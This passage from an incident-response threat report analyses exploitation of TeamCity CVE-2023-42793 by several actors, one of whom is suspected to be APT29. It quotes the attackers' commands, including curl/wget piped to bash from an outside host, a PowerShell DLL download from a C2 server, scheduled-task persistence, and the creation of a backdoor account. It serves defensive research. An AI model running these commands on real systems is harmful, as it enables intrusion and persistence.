        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 3: A snippet of the &#39;teamcity-server.log&#39; showing remote code execution evidence, including the associated command executed through the exploitation.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>Further analysis of the various commands executed on the vulnerable server through this RCE exploit led the IR team to believe multiple threat actors were conducting simultaneous operations. Some commands executed as part of this intrusion are shown in Table 1.</p>
<p> </p>
<table border="1" cellspacing="0" cellpadding="0" width="90%" align="center">
<tbody><tr><td width="156" valign="top"><p><b>Remote IP Address</b></p>
</td>
<td width="511" valign="top"><p><b>Commands Executed</b></p>
</td>
</tr><tr><td width="156" valign="top"><p>167[.]179[.]75[.]213</p>
</td>
<td width="511" valign="top"><p>Command line: whoami</p>
</td>
</tr><tr><td width="156" valign="top"><p>154[.]26[.]133[.]111</p>
</td>
<td width="511" valign="top"><p>Command line: bash -c &quot;nproc 2&gt;&amp;1&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>104[.]207[.]152[.]236</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe &quot;/c whoami&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>104[.]207[.]152[.]236</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe &quot;/c ipconfig /all&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>104[.]207[.]152[.]236</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe &quot;/c ipconfig /displaydns&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>104[.]207[.]152[.]236</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe &quot;/c hostname&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>74[.]207[.]242[.]113</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe &quot;/c tasklist /svc&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>74[.]207[.]242[.]113</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe &quot;/c netstat -ano&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>74[.]207[.]242[.]113</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe &quot;/c net user /domain&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>212[.]113[.]106[.]100</p>
</td>
<td width="511" valign="top"><p>Command line: uname -a</p>
</td>
</tr><tr><td width="156" valign="top"><p>212[.]113[.]106[.]100</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe /c whoami</p>
</td>
</tr><tr><td width="156" valign="top"><p>212[.]113[.]106[.]100</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe /c systeminfo</p>
</td>
</tr><tr><td width="156" valign="top"><p>212[.]113[.]106[.]100</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe /c net user</p>
</td>
</tr><tr><td width="156" valign="top"><p>212[.]113[.]106[.]100</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe /c &quot;echo 167043640 &gt; C:/Windows/Temp/0&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>43[.]248[.]34[.]77</p>
</td>
<td width="511" valign="top"><p>Command line: echo 2W1EVQsV5piPbyW6FSsNC8D7irR</p>
</td>
</tr><tr><td width="156" valign="top"><p>103[.]89[.]13[.]155</p>
</td>
<td width="511" valign="top"><p>Command line: echo 2W28BTpkdCjcRPQNkSF5qFCphlG</p>
</td>
</tr><tr><td width="156" valign="top"><p>195[.]246[.]120[.]4</p>
</td>
<td width="511" valign="top"><p>Command line: echo 2W28BTpkdCjcRPQNkSF5qFCphlG</p>
</td>
</tr><tr><td width="156" valign="top"><p>20[.]222[.]6[.]225</p>
</td>
<td width="511" valign="top"><p>Command line: echo 2W2GZqAg8k6ipgBTcHyK5wABDSW</p>
</td>
</tr><tr><td width="156" valign="top"><p>45[.]133[.]7[.]129</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe /c echo 9fW99pdqfpXU21zd</p>
</td>
</tr><tr><td width="156" valign="top"><p>45[.]133[.]7[.]154</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe &quot;/c net user &lt;redacted&gt; &quot;&lt;password redacted&gt;&quot; /add&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>45[.]133[.]7[.]154</p>
</td>
<td width="511" valign="top"><p>Command line: cmd.exe &quot;/c echo &lt;redacted&gt; | c:\TeamCity\bin\anydesk.exe --set-password&quot;</p>
</td>
</tr><tr><td width="156" valign="top"><p>45[.]133[.]7[.]156</p>
</td>
<td width="511" valign="top"><p>Command line: wget --no-check-certificate https[:]//fisheries-states-codes-camps.trycloudflare[.]com/rcu</p>
</td>
</tr><tr><td width="156" valign="top"><p>45[.]133[.]7[.]124</p>
</td>
<td width="511" valign="top"><p>Command line: /bin/sh -c &quot;(curl -s 194.38.22[.]53/tc.sh||wget -q -O- 194.38.22[.]53/tc.sh)|bash&quot;</p>
</td>
</tr></tbody></table>
<h5 style="text-align: center;"><span style="font-weight: normal;">Table 1. Commands executed by multiple threat actors on the TeamCity software host HOST_1_TEAMCITY.</span></h5>
<div><span style="font-weight: normal;"> </span></div>


</div>


    
    
    <div class="cmp cmp-text">
  <p>Looking critically at some of the attempted commands, it appears that some of the threat actors successfully exploited the vulnerability but were unsuccessful at running Linux system commands on the victim Windows Server. An example of this behavior can be seen in Figure 4.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1555627549.img.png/1702071998781/fig04-teamcity-log-showing-linux-command-execution-by-threat-actor.png" data-title="Figure 4: TeamCity log showing attempted Linux command execution by a threat actor following successful vulnerability exploitation.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1555627549.img.png/1702071998781/fig04-teamcity-log-showing-linux-command-execution-by-threat-actor.png" alt="Figure 4: TeamCity log showing attempted Linux command execution by a threat actor following successful vulnerability exploitation." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 4: TeamCity log showing attempted Linux command execution by a threat actor following successful vulnerability exploitation.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>It appears that several of the commands from various remote IPs may have been associated with the use of the open-source vulnerability scanner Nuclei<a href="#_ftn6" name="_ftnref1">[6]</a>. The IR team found a Nuclei template (CVE-2023-42793.yaml) designed to identify the presence of the TeamCity vulnerability in Nuclei's official template repository<a href="#_ftn7" name="_ftnref2">[7]</a>. The yaml template file contains the following line:</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;">POST /app/rest/debug/processes?exePath=echo&amp;params={{randstr}} HTTP/1.1</span></span></span></p>
<p>The resulting request would produce an echo command on a successfully exploited TeamCity server, identical to the echo commands observed in the victims' TeamCity logs. The IR team collated information from both logs to better understand the correlations between when the echo commands were executed and the associated network connections from the numerous public IP addresses. A snippet of this correlation is shown in Figure 5, where the echo commands generated by some of the Nuclei scanning are also highlighted.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_179090733.img.png/1702072025831/fig05-teamcity-snippet-correlated-logs-showing-network-connections.png" data-title="Figure 5: A snippet of correlated logs showing network connections and subsequent commands. Highlighted are multiple echo commands indicative of likely Nuclei scanning.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_179090733.img.png/1702072025831/fig05-teamcity-snippet-correlated-logs-showing-network-connections.png" alt="Figure 5: A snippet of correlated logs showing network connections and subsequent commands. Highlighted are multiple echo commands indicative of likely Nuclei scanning." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 5: A snippet of correlated logs showing network connections and subsequent commands. Highlighted are multiple echo commands indicative of likely Nuclei scanning.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>At this stage of the intrusion, it became clear that multiple threat actors were scanning for the vulnerability, validating if it could be exploited, and attempting to establish a foothold using the related exploitation. The following section of this report focuses on the activities of one of these threat actors distinct from other threat actor activities. We will refer to this culprit as the 'main threat actor.' A description of the activities conducted by other threat actors exploiting this vulnerability is covered more extensively in the following 'Other Threat Actors Activity' section.</p>
<h3><span style="font-weight: normal;">Main Threat Actor Intrusion</span></h3>
<p>The first activity attributed to the main threat actor was the execution of an echo command like those discussed above, indicating that the main threat actor likely employed Nuclei to identify potential victims. After this initial command, the main threat actor began executing additional discovery commands to gather system and privilege information. Some of these discovery commands are shown below:</p>
<p style="margin-left: 40.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;">cmd.exe &quot;/c systeminfo&quot;<br />
 whoami<br />
 ipconfig /all<br />
 whoami /all</span></span></span></p>
<p>The command attributed to the Nuclei scanning, as well as these subsequent discovery commands, were linked to different remote IP addresses. However, we assessed them as being from the same actor due to the slight timeline difference of a few seconds between the activities. This indicates the main threat actor uses different infrastructures to scan for victims and execute later commands.</p>
<p>One command and control (C2) IP address discovered during our investigation was linked to a US-based tertiary education organization. Upon detection of this active exploitation, the FortiGuard IR team notified the organization that their infrastructure may have been compromised and part of an ongoing APT29 campaign. They performed an internal investigation and identified exploitation of their vulnerable TeamCity server associated with the previously identified IP address. As part of this exploitation, the main threat actor used the TeamCity exploit to install an SSH certificate, which they then used to maintain access in this second victim's environment. The organization's security team provided additional information to the FortiGuard IR team, who then identified that the source of the attack on the educational organization was a TOR exit node. This report does not include the victim’s details used as a relay to protect their identity. They have successfully remediated their environment and patched the associated vulnerability.</p>
<p> After executing the discovery commands outlined above, the main threat actor attempted to download a DLL file, 'AclNumsInvertHost.dll,' on the TeamCity host using PowerShell and the 'Invoke-WebRequest' cmdlet. The actor used the following command to download the file:</p>
<p style="margin-left: 40.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;"><span style="color: black;">powershell -exec bypass -c &quot;Invoke-WebRequest -Uri<br />
 hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile<br />
 C:\Windows\System32\AclNumsInvertHost.dll&quot;</span></span></span></span></p>
<p>After successfully downloading this DLL file on the HOST_1_TEAMCITY, the main threat actor again used the TeamCity RCE vulnerability to create a Windows-scheduled task referencing this DLL file. They likely did this for persistence and to abstract their execution from the TeamCity exploitation. The actor used the following command to create the scheduled task:</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;">schtasks.exe /create /SC ONLOGON /tn<br />
 &quot;\Microsoft\Windows\DefenderUPDService&quot; /tr<br />
 &quot;\&quot;C:\Windows\system32\rundll32.exe\&quot;<br />
 \&quot;C:\Windows\system32\AclNumsInvertHost.dll\&quot;,AclNumsInvertHost&quot;</span></span></span></p>
<p>We recovered the associated Windows task file from the victim TeamCity server (HOST_1_TEAMCITY), confirming that the command in the TeamCity log had been successfully executed and the scheduled task was created. The retrieved Windows task data is shown in Figure 6:</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_820787577.img.png/1702072112057/fig06-teamcity-windows-task-created-by-threat-actor-for-persistence-of-dll-file.png" data-title="Figure 6: Windows task created by threat actor for the persistence of a DLL file.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_820787577.img.png/1702072112057/fig06-teamcity-windows-task-created-by-threat-actor-for-persistence-of-dll-file.png" alt="Figure 6: Windows task created by threat actor for the persistence of a DLL file." style="width: 800px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 6: Windows task created by threat actor for the persistence of a DLL file.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>After successfully creating the scheduled task, the actor attempted to execute the newly created task using the following command, again executed through the TeamCity RCE vulnerability on the HOST_1_TEAMCITY:</p>
<p style="margin-left: 48.0px;"><span style="font-size: 11.0pt;"><span style="font-family: Calibri , sans-serif;"><span style="font-family: &quot;Courier New&quot;;">schtasks.exe /run /tn &quot;\Microsoft\Windows\DefenderUPDService&quot;</span></span></span></p>
<p>Analyzing the scheduled task and its method of creation, we noticed two main indicators of interest: the URL 'hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll' and the file 'AclNumsInvertHost.dll.' We then analyzed the URL referenced for downloading this payload. At the time of the incident, there was limited open-source information on the IP contained in the URL or associated URLs. However, the certificate used on the webserver hosted at this IP was of interest. The certificate is expired with the common name '*.ultasrv[.]com'. This common name does not appear to be associated with a legitimate organization<a href="#_ftn8" name="_ftnref1">[8]</a>. The entity associated with ultasrv[.]com seems to be a VPS (Virtual Private Server) provider. Looking more closely at the webserver itself, we identified that it had an accessible open directory service. We then used this access to identify additional payloads hosted by the associated threat actor. The files on the server can be seen in Figure 7.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_494148241.img.png/1702072169996/fig07-teamcity-files-from-opendir-listing-c2-server.png" data-title="Figure 7: Files from the opendir listing of the C2 server used by the threat actor associated with TeamCity exploitation.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_494148241.img.png/1702072169996/fig07-teamcity-files-from-opendir-listing-c2-server.png" alt="Figure 7: Files from the opendir listing of the C2 server used by the threat actor associated with TeamCity exploitation." style="width: 800px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 7: Files from the opendir listing of the C2 server used by the threat actor associated with TeamCity exploitation.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>Some information on the hosted files is provided in Table 2, along with associated file hashes.</p>
<p> </p>
<table border="1" cellspacing="0" cellpadding="0" width="90%" align="center">
<tbody><tr><td width="60" valign="bottom"><p><b>Sr. No.</b></p>
</td>
<td width="142" valign="bottom"><p><b>Filename</b></p>
</td>
<td width="272" valign="bottom"><p><b>Description</b></p>
</td>
<td width="300" valign="top"><p><b>SHA1 Hash</b></p>
</td>
</tr><tr><td width="60" valign="bottom"><p>1</p>
</td>
<td width="142" valign="bottom"><p>a.zip</p>
</td>
<td width="272" valign="bottom"><p>Contains the rr.exe file</p>
</td>
<td width="300" valign="top"><p>e3a34930e5a814db0b5d0ac7c313cfb1c294b39e</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>2</p>
</td>
<td width="142" valign="bottom"><p>AclNumInvertHost.dll</p>
</td>
<td width="272" valign="bottom"><p>Malicious DLL</p>
</td>
<td width="300" valign="top"><p>d4411f70e0dcc2f88d74ae7251d51c6676075f6f</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>3</p>
</td>
<td width="142" valign="bottom"><p>ehttpserver.py</p>
</td>
<td width="272" valign="bottom"><p>Python HTTP server source code</p>
</td>
<td width="300" valign="top"><p>5d3b03d7e74e7c378b25f53d1fc3605776edbcaf</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>4</p>
</td>
<td width="142" valign="bottom"><p>iis.zip</p>
</td>
<td width="272" valign="bottom"><p>Contains iisexpresstray.exe, mscoree.dll, mscorees.dll</p>
</td>
<td width="300" valign="top"><p>abc50465a4b4108765a6cd6006c772fabd048458</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>5</p>
</td>
<td width="142" valign="bottom"><p>iisexpresstray.exe</p>
</td>
<td width="272" valign="bottom"><p>Legitimate executable from Microsoft that is part of IISExpress setup/installer</p>
</td>
<td width="300" valign="top"><p>c7f2137331105686aa4eb39bcfe1bae23fa19956</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>6</p>
</td>
<td width="142" valign="bottom"><p>jaspic-providers.xml</p>
</td>
<td width="272" valign="bottom"><p>Apache Tomcat configuration file</p>
</td>
<td width="300" valign="top"><p>ed6c18c49a8bde1170c97698aeb1b85292a1967d</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>7</p>
</td>
<td width="142" valign="bottom"><p>mscoree.dll</p>
</td>
<td width="272" valign="bottom"><p>Legitimate DLL file from Microsoft</p>
</td>
<td width="300" valign="top"><p>ada02e4442daa69427a2815a8819f3a1285ad772</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>8</p>
</td>
<td width="142" valign="bottom"><p>mscorees.dll</p>
</td>
<td width="272" valign="bottom"><p>Malicious DLL</p>
</td>
<td width="300" valign="top"><p>2df317b8a408d2ad5c94b9de6f20bbef03e46066</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>9</p>
</td>
<td width="142" valign="bottom"><p>omzu5a.ar</p>
</td>
<td width="272" valign="bottom"><p>Unknown file detected as data file</p>
</td>
<td width="300" valign="top"><p>38860565592ce018b415ecd72bc2fb1a0742702c</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>10</p>
</td>
<td width="142" valign="bottom"><p>pdhui_1.dll</p>
</td>
<td width="272" valign="bottom"><p>Malicious DLL</p>
</td>
<td width="300" valign="top"><p>5ce062f210e1a5026cb53e9949865312ee477e3c</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>11</p>
</td>
<td width="142" valign="bottom"><p>poc.py</p>
</td>
<td width="272" valign="bottom"><p>PoC python code used by the actor to exploit TeamCity vulnerability CVE-2023-42793</p>
</td>
<td width="300" valign="top"><p>bcbadf744954660f9a46324649eda6a14d724cbc</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>12</p>
</td>
<td width="142" valign="bottom"><p>rr.exe</p>
</td>
<td width="272" valign="bottom"><p>Unknown executable</p>
</td>
<td width="300" valign="top"><p>18192bb4aaa1b72104be4d26460b55f31ca65baf</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>13</p>
</td>
<td width="142" valign="bottom"><p>server.py</p>
</td>
<td width="272" valign="bottom"><p>Python HTTP server code</p>
</td>
<td width="300" valign="top"><p>b2829fd893f26cb513018c4e03428f1ef5915da0</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>14</p>
</td>
<td width="142" valign="bottom"><p>sudoers</p>
</td>
<td width="272" valign="bottom"><p>Linux sudoer config file</p>
</td>
<td width="300" valign="top"><p>d3a19eb3db9f7fe8d984e124da95a4c1cafa332e</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>15</p>
</td>
<td width="142" valign="bottom"><p>winmms.dll</p>
</td>
<td width="272" valign="bottom"><p>Malicious DLL</p>
</td>
<td width="300" valign="top"><p>3a32e516c037c37f7bf83171e167511ba53870a7</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>16</p>
</td>
<td width="142" valign="bottom"><p>winmm.dll</p>
</td>
<td width="272" valign="bottom"><p>Legitimate DLL file from Microsoft</p>
</td>
<td width="300" valign="top"><p>d5cc1f2549fa138a931ad43d5d81d3a367c0de6e</p>
</td>
</tr><tr><td width="60" valign="bottom"><p>17</p>
</td>
<td width="142" valign="bottom"><p>zabbix.zip</p>
</td>
<td width="272" valign="bottom"><p>Contains pdhui_1.dll (a malicious DLL) and other legitimate Zabbix (opensource monitoring software) files</p>
</td>
<td width="300" valign="top"><p>281bb0dadc789b89f7ae30d5f4bdeae57c66b0e1</p>
</td>
</tr></tbody></table>
<h5 style="text-align: center;"><span style="font-weight: normal;">Table 2. Descriptions of files found on the C2 server 103.76.128[.]34.</span></h5>
<div><span style="font-weight: normal;"> </span></div>


</div>


    
    
    <div class="cmp cmp-text">
  <p>Analysis of the code in the poc.py file identified the script as a custom Python implementation of an exploit for the TeamCity vulnerability CVE-2023-42793. You can see the request URL found in the log and the Python code used to generate the request in Figure 8.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1961617766.img.png/1702072215719/fig08-teamcity-snippet-code-poc-py-c2-web-server-log.png" data-title="Figure 8: A snippet of code from poc.py found on the C2 web server, and a snippet of the TeamCity log showing a similar request received by the victim during exploitation.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_1961617766.img.png/1702072215719/fig08-teamcity-snippet-code-poc-py-c2-web-server-log.png" alt="Figure 8: A snippet of code from poc.py found on the C2 web server, and a snippet of the TeamCity log showing a similar request received by the victim during exploitation." style="width: 800px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 8: A snippet of code from poc.py found on the C2 web server, and a snippet of the TeamCity log showing a similar request received by the victim during exploitation.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>Comparing the structure of a request sent using this script and the commands executed from the victim logs, it is almost certain that this script was used to deliver the exploit to the victim TeamCity server (HOST_1_TEAMCITY ). This links the IP extracted from the scheduled task (103[.]76[.]128[.]34) to the source of the exploitation from the logs shown in Figure 9 (45[.]138[.]16[.]63). Using the FortiGuard Central Threat System (CTS), we could also see that the IP address associated with the exploitation has been linked to other significant malicious activity. Of the 171 domains associated with this IP, 92 have been tagged with high confidence as malicious, and 78 have been tagged with high confidence as suspicious. Only one of the domains has been tagged as low risk (Figure 9).</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_305512722.img.png/1702072250279/fig09-teamcity-fortiguard-cts-info-ip-associated-with-main-threat-actor.png" data-title="Figure 9: FortiGuard CTS information on the IP associated with the main threat actor TeamCity exploitation in the victim environment.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_305512722.img.png/1702072250279/fig09-teamcity-fortiguard-cts-info-ip-associated-with-main-threat-actor.png" alt="Figure 9: FortiGuard CTS information on the IP associated with the main threat actor TeamCity exploitation in the victim environment." style="width: 600px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 9: FortiGuard CTS information on the IP associated with the main threat actor TeamCity exploitation in the victim environment.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>The other element of interest in the scheduled task created by the main threat actor was the DLL file, 'AclNumsInvertHost.dll.' Our analysis identified that the DLL AclNumsInvertHost.dll has ten file sections. The most notable was '.fy55f5', which is a user-modified section. This section has an MZ header (indicating it is a Windows portable executable), but the remainder of the code has a high entropy of 7.99, which is typically indicative of encryption. The '.fy55f5' section can be seen in Figure 10.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_352136246.img.png/1702072301376/fig10-teamcity-encrypted-code-section-executed.png" data-title="Figure 10: Encrypted code section of the AclNumsInvertHost.dll executed as part of the main threat actor&#39;s scheduled task persistence.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_352136246.img.png/1702072301376/fig10-teamcity-encrypted-code-section-executed.png" alt="Figure 10: Encrypted code section of the AclNumsInvertHost.dll executed as part of the main threat actor&#39;s scheduled task persistence." class="custom"/>
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 10: Encrypted code section of the AclNumsInvertHost.dll executed as part of the main threat actor&#39;s scheduled task persistence.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>The IR team believes that this '.fy55f5' section of the DLL contains the final payload, which is decrypted at runtime. There are a number of anti-debug techniques implemented within the DLL file code that inhibited dynamic analysis during the engagement. To understand the DLL functionality more quickly, we performed comprehensive Yara scanning of all the files pulled from the threat actors' webserver. The AclNumsInvertHost.dll library and multiple other DLL files matched on a Yara rule for a known malware family called 'GraphicalProton.' The positive Yara rule match was developed by Insikt Group from Recorded Future and is based on a specific API calling method employed by previously observed GraphicalProton samples. A match for this rule is a high-confidence indicator of GraphicalProton. The results of the matching Yara scan are shown in Figure 11.</p>


</div>


    
    
    <div class="cmp cmp-image">

    
    <div class="image-enlarge">
        <a class="cmp-image--link" href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_648856310.img.png/1702072332327/fig11-teamcity-yara-rule-for-graphical-proton.png" data-title="Figure 11: Yara rule for GraphicalProton matched against multiple DLL files found on the main threat actor opendir server.">
            <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
                <img src="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793/_jcr_content/root/responsivegrid/table_content/par/image_648856310.img.png/1702072332327/fig11-teamcity-yara-rule-for-graphical-proton.png" alt="Figure 11: Yara rule for GraphicalProton matched against multiple DLL files found on the main threat actor opendir server." style="width: 800px;" class="custom"/>
                
            </noscript>
        </a>
    </div>
    <!--<div class="enlarge-btn" data-sly-test="true"><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
    <span class="cmp-image--title">Figure 11: Yara rule for GraphicalProton matched against multiple DLL files found on the main threat actor opendir server.</span>


    
</div>


    
    
    <div class="cmp cmp-text">
  <p>The files in Figure 11 also matched the Yara rule M_Dropper_BURNTBATTER_1, which searches for the custom chaskey implementation. This Yara rule was from the article, 'Backchannel Diplomacy: APT29's Rapidly Evolving Diplomatic Phishing Operations,' by Mandiant<a href="#_ftn9" name="_ftnref1">[9]</a>.</p>
<p>GraphicalProton is a malware historically employed by group APT29. While this tooling is confidently linked to APT29 (Mandiant) or BlueBravo (Recorded Future), the victimology and initial access vector employed by the main threat actor throughout earlier stages of this intrusion does not align with currently reported APT29 campaigns. However, a previous well-known attack from APT29 targeted the company Solarwinds, using the same build of the TeamCity management tool<a href="#_ftn10" name="_ftnref2">[10]</a>. While the IR team could not attribute this activity to APT29 with high confidence, associated threat intelligence was used to focus our investigation further.<a href="#_ftn11" name="_ftnref3">[11]</a></p>
<p>At this stage of the intrusion, FortiEDR detected and blocked this scheduled task from executing due to its suspicious use of rundll32.exe and a machine learning assessment of the previously unobserved DLL 'AclNumsInvertHost.dll.' This forced the main threat actor to attempt alternative methods of execution.</p>
<p>The first alternative method was to use the TeamCity exploit on HOST_1_TEAMCITY to download the 'iisexpresstray.exe' and 'mscoree.dll' files from the same C2 through PowerShell. These two files were written to the directory' C:\Windows\WinStore\'. The 'iisexpress.exe' file is a legitimate signed installer executable for IISExpress, a lightweight implementation of IIS provided by Microsoft<a href="#_ftn12" name="_ftnref4">[12]</a>. However, downloaded alongside this legitimate installer was 'mscoree.dll,' a malicious DLL file with the same name as a legitimate DLL (T1036.005).<a href="#_ftn13" name="_ftnref5">[13]</a> The combination of these two files would allow the threat actor to employ DLL search order hijacking (T1574.001)<a href="#_ftn14" name="_ftnref6">[14]</a> to execute their malicious DLL when the legitimate IISExpress executable is executed.</p>
<p>To execute this side-loading attack, the main threat actor created another scheduled task using the following command executed via the TeamCity exploit:</p>
